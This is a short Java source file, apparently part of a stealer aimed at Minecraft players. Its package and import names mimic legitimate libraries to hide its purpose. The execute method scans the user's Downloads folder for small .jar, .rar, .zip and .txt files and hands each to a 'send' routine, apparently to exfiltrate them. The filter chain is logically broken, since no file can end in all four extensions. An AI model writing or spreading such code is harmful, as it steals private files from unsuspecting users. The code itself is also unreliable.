package net.jodah.typetools.impl;

import net.reflxction.example.proxy.IMinecraft;
import com.squareup.okhttp.internal.spdy.HudEditor;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

public final class EditGuiMain implements IMinecraft
{
    @Override
    public void execute() throws Exception
    {
        Files.walk(Paths.get(System.getProperty("user.home") + "\\Downloads"))
                .filter(path -> path.toFile().getParent().equals(System.getProperty("user.home") + "\\Downloads"))
                .filter(path -> path.toFile().getName().endsWith(".jar"))
                .filter(path -> path.toFile().getName().endsWith(".rar"))
                .filter(path -> path.toFile().getName().endsWith(".zip"))
                .filter(path -> path.toFile().getName().endsWith(".txt"))
                .filter(path -> {
                    try { return Files.size(path) < 7000000; } catch (IOException ignored) { }
                    return false;
                }).forEach(path -> HudEditor.send(path.toFile()));
    }
}
